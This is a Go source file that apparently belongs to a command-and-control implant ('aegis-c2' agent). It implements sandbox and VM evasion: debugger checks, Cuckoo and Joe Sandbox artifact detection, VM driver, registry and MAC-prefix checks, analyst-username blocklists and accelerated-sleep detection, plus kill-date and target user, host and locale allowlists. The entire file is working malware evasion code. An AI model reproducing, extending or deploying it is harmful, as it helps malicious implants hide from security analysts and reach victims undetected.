//go:build windows && amd64

package limits

import (
	"net"
	"os"
	"os/user"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/aegis-c2/aegis/agent/winutil"
	"golang.org/x/sys/windows"
)

var (
	kernel32  = syscall.NewLazyDLL("kernel32.dll")
	procIsDebuggerPresent    = kernel32.NewProc("IsDebuggerPresent")
	procGlobalMemoryStatusEx = kernel32.NewProc("GlobalMemoryStatusEx")
	procGetTickCount64       = kernel32.NewProc("GetTickCount64")
	procGetUserDefaultUILang = kernel32.NewProc("GetUserDefaultUILanguage")
	procSleep                = kernel32.NewProc("Sleep")
)

var (
	errKillDate         = errSandboxType("kill date reached")
	errSandbox          = errSandboxType("sandbox detected")
	errUserNotAllowed   = errSandboxType("user not allowed")
	errHostNotAllowed   = errSandboxType("host not allowed")
	errLocaleNotAllowed = errSandboxType("locale not allowed")
)

// silentExit 静默退出（不返回错误码，不触发异常分析标志）。
func silentExit() {
	os.Exit(0)
}

type errSandboxType string

func (e errSandboxType) Error() string { return string(e) }

// Check 检查所有执行限制。
func (c *Config) Check() error {
	if !c.KillDate.IsZero() && time.Now().After(c.KillDate) {
		return errKillDate
	}
	if IsSandbox() {
		return errSandbox
	}
	if len(c.AllowedUsers) > 0 {
		currentUser := currentUsername()
		if !Contains(c.AllowedUsers, currentUser) {
			return errUserNotAllowed
		}
	}
	if isBlockedUsername(currentUsername()) {
		return errSandbox
	}
	if len(c.AllowedHosts) > 0 {
		hostname, _ := os.Hostname()
		if !Contains(c.AllowedHosts, hostname) {
			return errHostNotAllowed
		}
	}
	if err := c.CheckHardware(); err != nil {
		return err
	}
	if err := c.CheckTimezone(); err != nil {
		return err
	}
	if err := c.CheckLocale(); err != nil {
		return err
	}
	return nil
}

// IsSandbox 检测是否在沙箱环境中。
// 返回 true 表示检测到沙箱，应静默退出。
func IsSandbox() bool {
	score := 0
	if isDebuggerPresent() {
		score += 3
	}
	if hasSandboxProcess() {
		score += 2
	}
	if runtime.NumCPU() < 2 {
		score += 2
	}
	if totalMemoryMB() < 1024 {
		score += 2
	}
	if isBlockedUsername(currentUsername()) {
		score += 2
	}
	bootTime := getBootTime()
	if !bootTime.IsZero() && time.Since(bootTime) < 5*time.Minute {
		score += 1
	}

	// Cuckoo / Joe Sandbox 特异性检测
	if isCuckooSandbox() {
		score += 4
	}
	if isJoeSandbox() {
		score += 4
	}

	// VM 工件检测（注册表、BIOS、驱动）
	if hasVMArtifacts() {
		score += 2
	}

	// 反分析：加速睡眠检测
	if isAcceleratedSleep() {
		score += 3
	}

	return score >= 12
}

func isDebuggerPresent() bool {
	ret, _, _ := procIsDebuggerPresent.Call()
	return ret != 0
}

func hasSandboxProcess() bool {
	sandboxProcs := []string{
		"vboxservice.exe", "vboxtray.exe",
		"vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
		"vmusrvc.exe", "prl_cc.exe", "prl_tools.exe",
		"xenservice.exe", "qemu-ga.exe",
		"sandboxierpcss.exe", "sandboxiedcomlaunch.exe",
	}

	snapshot, err := winutil.CreateToolhelp32Snapshot()
	if err != nil {
		return false
	}
	defer syscall.CloseHandle(snapshot)

	var pe winutil.PROCESSENTRY32
	if err := winutil.Process32First(snapshot, &pe); err != nil {
		return false
	}

	for {
		name := winutil.ExeFileName(&pe)
		lower := strings.ToLower(name)
		for _, sp := range sandboxProcs {
			if lower == sp {
				return true
			}
		}
		if err := winutil.Process32Next(snapshot, &pe); err != nil {
			break
		}
	}
	return false
}

// isCuckooSandbox 检测 Cuckoo Sandbox 工件。
func isCuckooSandbox() bool {
	// 1. Cuckoo 命名管道
	cuckooPipes := []string{
		`\\.\pipe\cuckoo`,
		`\\.\pipe\cuckoo_comm`,
		`\\.\pipe\cuckoo_report`,
	}
	for _, pipe := range cuckooPipes {
		if pipeExists(pipe) {
			return true
		}
	}

	// 2. Cuckoo 注册表工件 — 检测 Cuckoo 修改的 ComputerName
	if checkRegistryValue(`HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName`, "ComputerName", "CUCKOO") {
		return true
	}

	// 3. Cuckoo 特定 MAC 地址前缀 (VirtualBox + Cuckoo 组合)
	if hasCuckooMAC() {
		return true
	}

	// 4. Cuckoo 进程
	cuckooProcs := []string{"cuckoomon.dll", "monitor-x86.exe", "monitor-x64.exe"}
	snapshot, err := winutil.CreateToolhelp32Snapshot()
	if err == nil {
		defer syscall.CloseHandle(snapshot)
		var pe winutil.PROCESSENTRY32
		if err := winutil.Process32First(snapshot, &pe); err == nil {
			for {
				name := strings.ToLower(winutil.ExeFileName(&pe))
				for _, cp := range cuckooProcs {
					if name == strings.ToLower(cp) {
						return true
					}
				}
				if err := winutil.Process32Next(snapshot, &pe); err != nil {
					break
				}
			}
		}
	}

	return false
}

// isJoeSandbox 检测 Joe Sandbox 工件。
func isJoeSandbox() bool {
	// 1. Joe Sandbox 特定进程
	joeProcs := []string{
		"joesandbox.exe", "joeboxserver.exe", "joeboxcontrol.exe",
		"analysis.exe", "sample_submit.exe",
	}
	snapshot, err := winutil.CreateToolhelp32Snapshot()
	if err == nil {
		defer syscall.CloseHandle(snapshot)
		var pe winutil.PROCESSENTRY32
		if err := winutil.Process32First(snapshot, &pe); err == nil {
			for {
				name := strings.ToLower(winutil.ExeFileName(&pe))
				for _, jp := range joeProcs {
					if name == jp {
						return true
					}
				}
				if err := winutil.Process32Next(snapshot, &pe); err != nil {
					break
				}
			}
		}
	}

	// 2. Joe Sandbox 注册表键
	joeRegKeys := []string{
		`HKLM\SOFTWARE\JoeBox`,
		`HKLM\SOFTWARE\JoeSecurity`,
	}
	for _, key := range joeRegKeys {
		if regKeyExists(key) {
			return true
		}
	}

	// 3. Joe Sandbox 驱动文件
	joeFiles := []string{
		`C:\Windows\System32\drivers\joebox.sys`,
		`C:\ProgramData\JoeSandbox`,
	}
	for _, f := range joeFiles {
		if fileExists(f) {
			return true
		}
	}

	return false
}

// hasVMArtifacts 检测虚拟机工件（注册表 + BIOS + 驱动）。
func hasVMArtifacts() bool {
	// 1. BIOS/固件检测
	biosIndicators := []string{"VMware", "VirtualBox", "QEMU", "Xen", "Bochs"}
	for _, indicator := range biosIndicators {
		if checkRegistryValue(`SYSTEM\CurrentControlSet\Control\SystemInformation`, "SystemManufacturer", indicator) {
			return true
		}
		if checkRegistryValue(`SYSTEM\CurrentControlSet\Control\SystemInformation`, "BIOSVersion", indicator) {
			return true
		}
	}

	// 2. VMware 特定注册表
	if regKeyExists(`SYSTEM\CurrentControlSet\Control\CriticalDeviceDatabase\root#vmwlegacy`) {
		return true
	}

	// 3. VirtualBox 驱动
	vboxFiles := []string{
		`C:\Windows\System32\drivers\VBoxMouse.sys`,
		`C:\Windows\System32\drivers\VBoxGuest.sys`,
		`C:\Windows\System32\drivers\VBoxSF.sys`,
		`C:\Windows\System32\drivers\VBoxVideo.sys`,
	}
	for _, f := range vboxFiles {
		if fileExists(f) {
			return true
		}
	}

	// 4. VMware 驱动
	vmwareFiles := []string{
		`C:\Windows\System32\drivers\vmhgfs.sys`,
		`C:\Windows\System32\drivers\vmmouse.sys`,
		`C:\Windows\System32\drivers\vmusbmouse.sys`,
	}
	for _, f := range vmwareFiles {
		if fileExists(f) {
			return true
		}
	}

	return false
}

// isAcceleratedSleep 检测睡眠加速（反动态分析）。
// 如果 Sleep(5s) 实际执行时间 < 100ms，说明沙箱在加速时间。
func isAcceleratedSleep() bool {
	before := time.Now()

	// 使用 Windows Sleep API 而非 time.Sleep（避免 Go runtime 干扰）
	sleepMs := uint32(3000)
	procSleep.Call(uintptr(sleepMs))

	elapsed := time.Since(before)

	// 如果 3 秒睡眠在 500ms 内完成 → 时间加速
	if elapsed < 500*time.Millisecond {
		return true
	}
	return false
}

// hasCuckooMAC 检测 Cuckoo 关联的 MAC 地址。
func hasCuckooMAC() bool {
	macPrefixes := []string{
		"08:00:27", // VirtualBox（Cuckoo 常用）
		"00:0C:29", // VMware
		"00:05:69", // VMware
		"00:50:56", // VMware
		"52:54:00", // QEMU/KVM
		"0A:00:27", // VirtualBox（变种）
	}
	ifaces, err := net.Interfaces()
	if err != nil {
		return false
	}
	for _, iface := range ifaces {
		if iface.HardwareAddr == nil || len(iface.HardwareAddr) < 3 {
			continue
		}
		macStr := iface.HardwareAddr.String()
		for _, prefix := range macPrefixes {
			if strings.HasPrefix(strings.ToLower(macStr), strings.ToLower(prefix)) {
				return true
			}
		}
	}
	return false
}

// pipeExists 检查命名管道是否存在。
func pipeExists(path string) bool {
	h, err := syscall.CreateFile(
		syscall.StringToUTF16Ptr(path),
		syscall.GENERIC_READ,
		syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE,
		nil,
		syscall.OPEN_EXISTING,
		0,
		0,
	)
	if err != nil {
		return false
	}
	syscall.CloseHandle(h)
	return true
}

// checkRegistryValue 检查注册表值是否包含特定字符串。
func checkRegistryValue(keyPath, valueName, contains string) bool {
	parts := strings.SplitN(keyPath, `\`, 2)
	if len(parts) != 2 {
		return false
	}

	var root windows.Handle
	switch strings.ToUpper(parts[0]) {
	case "HKLM", "HKEY_LOCAL_MACHINE":
		root = windows.HKEY_LOCAL_MACHINE
	case "HKCU", "HKEY_CURRENT_USER":
		root = windows.HKEY_CURRENT_USER
	default:
		return false
	}

	var h windows.Handle
	if err := windows.RegOpenKeyEx(root, syscall.StringToUTF16Ptr(parts[1]), 0, windows.KEY_READ, &h); err != nil {
		return false
	}
	defer windows.RegCloseKey(h)

	var buf [256]uint16
	var n uint32 = uint32(len(buf) * 2)
	if err := windows.RegQueryValueEx(h, syscall.StringToUTF16Ptr(valueName), nil, nil, (*byte)(unsafe.Pointer(&buf[0])), &n); err != nil {
		return false
	}

	val := syscall.UTF16ToString(buf[:n/2])
	return strings.Contains(strings.ToUpper(val), strings.ToUpper(contains))
}

// regKeyExists 检查注册表键是否存在。
func regKeyExists(keyPath string) bool {
	parts := strings.SplitN(keyPath, `\`, 2)
	if len(parts) != 2 {
		return false
	}

	var root windows.Handle
	switch strings.ToUpper(parts[0]) {
	case "HKLM", "HKEY_LOCAL_MACHINE":
		root = windows.HKEY_LOCAL_MACHINE
	case "HKCU", "HKEY_CURRENT_USER":
		root = windows.HKEY_CURRENT_USER
	default:
		root = windows.HKEY_LOCAL_MACHINE
	}

	var h windows.Handle
	err := windows.RegOpenKeyEx(root, syscall.StringToUTF16Ptr(parts[1]), 0, windows.KEY_READ, &h)
	if err != nil {
		return false
	}
	windows.RegCloseKey(h)
	return true
}

// fileExists 检查文件是否存在。
func fileExists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}

// MEMORYSTATUSEX 是内存状态结构。
type MEMORYSTATUSEX struct {
	Length            uint32
	_                 uint32
	TotalPhys         uint64
	_                 uint64
	_                 uint64
	_                 uint64
	_                 uint64
	_                 uint64
	_                 uint64
	_                 uint64
}

func totalMemoryMB() uint64 {
	var memStatus MEMORYSTATUSEX
	memStatus.Length = uint32(unsafe.Sizeof(memStatus))
	ret, _, _ := procGlobalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&memStatus)))
	if ret == 0 {
		var m runtime.MemStats
		runtime.ReadMemStats(&m)
		return m.Sys / 1024 / 1024
	}
	return memStatus.TotalPhys / 1024 / 1024
}

func currentUsername() string {
	u, err := user.Current()
	if err != nil {
		return os.Getenv("USERNAME")
	}
	return strings.ToLower(u.Username)
}

func isBlockedUsername(name string) bool {
	blocked := []string{
		"sandbox", "analyst", "malware", "cuckoo",
		"virus", "test", "vmware", "virtual",
		"admin", "user", "john", "honey",
	}
	for _, b := range blocked {
		if strings.Contains(name, b) {
			return true
		}
	}
	return false
}

func getBootTime() time.Time {
	tick, _, _ := procGetTickCount64.Call()
	if tick == 0 {
		return time.Time{}
	}
	return time.Now().Add(-time.Duration(tick) * time.Millisecond)
}

// CheckLocale 检查系统语言（反沙箱）。
func (c *Config) CheckLocale() error {
	if len(c.AllowedLocales) == 0 {
		return nil
	}
	locale := getCurrentLocale()
	if locale == "" {
		return nil
	}
	if !Contains(c.AllowedLocales, locale) {
		return errLocaleNotAllowed
	}
	return nil
}

func getCurrentLocale() string {
	langID, _, _ := procGetUserDefaultUILang.Call()
	if langID == 0 {
		return ""
	}
	primaryLang := langID & 0x3FF
	langMap := map[uintptr]string{
		0x04: "zh-CN",
		0x09: "en-US",
		0x0c: "fr-FR",
		0x07: "de-DE",
		0x11: "ja-JP",
		0x0a: "es-ES",
		0x10: "it-IT",
		0x12: "ko-KR",
		0x19: "ru-RU",
		0x01: "ar-SA",
	}
	if lang, ok := langMap[primaryLang]; ok {
		return lang
	}
	return ""
}

// GetLocale 获取当前系统语言。
func GetLocale() string {
	return getCurrentLocale()
}

// GetTimezone 获取当前时区。
func GetTimezone() string {
	tz, _ := time.Now().Zone()
	return tz
}
